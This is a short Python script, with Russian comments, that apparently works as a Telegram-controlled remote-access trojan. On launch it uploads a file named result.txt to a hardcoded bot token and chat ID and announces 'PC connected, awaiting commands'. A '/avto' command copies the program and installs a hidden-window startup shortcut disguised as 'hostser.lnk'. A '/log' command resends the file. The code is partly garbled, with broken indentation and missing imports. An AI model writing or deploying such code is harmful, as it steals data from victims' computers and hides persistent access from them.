import telebot

# Замените на свой токен и ID чата
token = '6858417984:AAHHM_2Oj-KAvw3muNtpqb7kOE5HS_2FH-U'
chat_id = 1882056354

bot = telebot.TeleBot(token)

# Функция для отправки файла
def send_file(file_path):
 with open(file_path, 'rb') as f:
  bot.send_document(chat_id=chat_id, document=f)

# Отправляем файл и сообщение
send_file('result.txt')
bot.send_message(chat_id=chat_id, text="ПОДЛЮЧЕН ПК\nОжидаю команды...")
@bot.message_handler(commands=['avto'])
                def avto(message):
                    try:
                        pythoncom.CoInitialize()
                        current_program = os.path.abspath(sys.argv[0])
                        bot.send_message(message.chat.id, current_program)
                        print(current_program)
                        user_folder = os.path.expanduser("~")
                        copy_folder = os.path.join(user_folder, "MyProgram")
                        os.makedirs(copy_folder, exist_ok=True)
                        shutil.copy(current_program, copy_folder)
                        shortcut_name = "hostser.lnk"
                        shortcut_path = os.path.join(user_folder, shortcut_name)
                        with winshell.shortcut(shortcut_path) as shortcut:
                            shortcut.path = os.path.join(copy_folder, os.path.basename(current_program))
                            shortcut.show_cmd = win32con.SW_HIDE  # Скрыть окно
                            shortcut.icon = (None, 0)
                        startup_folder = winshell.startup()
                        startup_shortcut_path = os.path.join(startup_folder, os.path.basename(shortcut_path))
                        shutil.copy(shortcut_path, startup_shortcut_path)
                        bot.send_message(message.chat.id, "Успешно добавил в автозапуск!")
                    except Exception as e:
                        bot.send_message(message.chat.id, f"Ошибка при добавлении в автозапуск: {e}")
# Обработчик команды /log
@bot.message_handler(commands=['log'])
def handle_log(message):
 send_file('result.txt')

# Запускаем бота
bot.polling(none_stop=True)
